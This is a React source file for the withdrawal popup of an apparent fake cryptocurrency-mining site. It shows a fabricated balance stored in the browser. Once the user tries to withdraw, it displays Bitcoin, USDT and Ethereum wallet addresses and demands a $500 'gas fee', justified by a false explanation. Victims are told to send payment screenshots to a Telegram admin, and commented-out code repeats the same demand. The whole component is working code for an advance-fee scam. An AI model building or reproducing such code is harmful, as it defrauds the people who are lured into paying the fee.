import React, { useState, useEffect } from "react";
import "./withdraw.css";
import toast from "react-hot-toast";
import { useHistory } from "react-router-dom";


const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [storedWithdrawAmount, setStoredWithdrawAmount] = useState(0);
  const [success, setSuccess] = useState(false);
  const history = useHistory();


  // Load stored withdrawal amount from local storage on component mount
  useEffect(() => {
    const storedAmount = localStorage.getItem("totalVolume");
    if (storedAmount) {
      setStoredWithdrawAmount(parseFloat(storedAmount));
    }
  }, []);


  useEffect(() => {
    setTimeout(() => {
      if (success) {
        setSuccess(false);
        onClose();
      }
    }, 6000);
  }, [success, onClose]);

  // toast.success(
  //   <div>
  //     ✅ Succesfull Withdrawal.
  //     <br />
  //     <span style={{ color: "darkgoldenrod", fontWeight: "bolder" }}>
  //       ✅ ${parseFloat(withdrawAmount).toFixed(2)}&nbsp;
  //     </span>
  //     Withdrawn!.
  //     <br />
  //     ✅ Thank You!.
  //     {/* Thank You. */}
  //   </div>
  // );

  const handleWithdraw = async () => {

    if (!withdrawAmount || Number.isNaN(withdrawAmount) || parseFloat(withdrawAmount) <= 0) {
      alert("Please enter a valid withdrawal amount.");
      return;
    }

    if (parseFloat(withdrawAmount) > storedWithdrawAmount) {
      alert("Unable to withdraw this amount. Insufficient funds.");
      return;
    }
    if (parseFloat(storedWithdrawAmount) < 3000) {
      alert("Your balance must be up to 3000.");
      return;
    }


    const userEmail = localStorage.getItem("userEmail");
    if (!userEmail) {
      alert("Please login before you can perform withdraw");
      return;
    }

    const SERVER_BASE_URL = "https://exam-nodejs-main.onrender.com";
    const CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT = `${SERVER_BASE_URL}/api/withdrawal/approval/`;

    try {

      const res = await fetch(`${CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT}${userEmail}`, { method: 'POST' });
      const isApproved = (await res.json())?.withdrawal_status;

      if (isApproved) {
        console.log("[USER - APPROVED]");
        toast.success(
          <div>
            ✅ Succesfull Withdrawal.
            <br />
            <span style={{ color: "darkgoldenrod", fontWeight: "bolder" }}>
              ✅ ${parseFloat(withdrawAmount).toFixed(2)}&nbsp;
            </span>
            Withdrawn!.
            <br />
            ✅ Thank You!.
            {/* Thank You. */}
          </div>
        );
        setTimeout(() => window.location.reload(), 3000);
        return;
      }

      // Withdraw successful, set success to true
      setSuccess(true);
      // console.log("[USER - NOT - APPROVED]");

    } catch (error) {
      toast.error("\n🚫 Network Error \n🚫Please Try Again.");
      // setTimeout(() => window.location.reload(), 3000);
    }


    // You can include logic here to send the withdrawal details to your backend

    // const btcAddress = "123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j";
    // const usdtTrc20Address = "TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy";
    // const ethereumAddress = "0x87cdd933bf000f96309215752696ae080f684ba9";
    // const link = "https://t.me/startmininghere";

    // Display success message with withdrawal details
    // alert(
    //   `Pay $500 to any of this address for processing!\nBTC Address: ${btcAddress}\nUSDT TRC20 Address: ${usdtTrc20Address}\nEthereum Address: ${ethereumAddress} \ncontact address: ${link}`
    // );
    // toast(
    //   `Pay $500 to any of this address for processing!\nBTC Address: ${btcAddress}\nUSDT TRC20 Address: ${usdtTrc20Address}\nEthereum Address: ${ethereumAddress} \ncontact address: ${link}`
    // );
  };

  return (
    <div className={`withdraw-popup ${isOpen ? "open" : ""}`}>
      <div className="withdraw-popup-content">
        {success ? (
          <p className="success-message">
            <span style={{ color: "yelloe" }}> btcAddress = 123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j</span>
            <span style={{ color: "green" }}> usdtTrc20Address = TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy</span>
            <span style={{ color: "orange" }}> ethereumAddress = 0x87cdd933bf000f96309215752696ae080f684ba9 </span>
            <span style={{ color: "red" }}>
              (WITHDRAWALS WILL NEED A GAS FEE OF $500)
              <br />

              Gas fee are meant to be paid for the transaction that has been occurring during your mining ⛏ process,
              this gas fee is use to settle the transactions when mining,
              without it the mining server you mining from won’t allow you to withdraw the money you mined.
            </span>
            <br />
            <span style={{ color: "red" }}>

              <span style={{ color: "green" }}> (How to confirm): </span>
              Send payment screenshot to our admin 👩‍💼 on telegram to process your withdrawal approval.
              <br />

              <span style={{ color: "green" }}>(How to pay): </span>
              Send payment to the provided wallet address provided to you on the page.
              <br />

            </span>

            <span style={{ color: "green" }}>💬 Contact use to get started:
              <a style={{ color: "blue" }} target="_blank" rel="noreferrer" href="https://t.me/startmininghere">(https://t.me/startmininghere)</a>
            </span>
          </p>
        ) : (
          <>
            <span className="close" onClick={onClose}>
              &times;
            </span>
            <h2 style={{ color: "black" }}> Withdraw Funds</h2>
            <label style={{ color: "black" }} htmlFor="withdrawAmount">
              Amount:
            </label>
            <input
              style={{ color: "black", backgroundColor: "grey" }}
              type="number"
              id="withdrawAmount"
              value={withdrawAmount}
              onChange={(e) => setWithdrawAmount(e.target.value)}
            />
            <label style={{ color: "black" }} htmlFor="withdrawAmount">
              Address:
            </label>
            <input style={{ color: "black", backgroundColor: "grey" }} type="text" id="withdrawAmount" />
            <div style={{ color: "black" }}>Available Withdrawal Amount: <span style={{ color: "darkgoldenrod" }}> ${storedWithdrawAmount.toFixed(2)} </span>  </div>

            <button type="button" style={{ backgroundColor: "black", color: "orange" }} onClick={handleWithdraw}>
              Withdraw
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default WithdrawPopup;
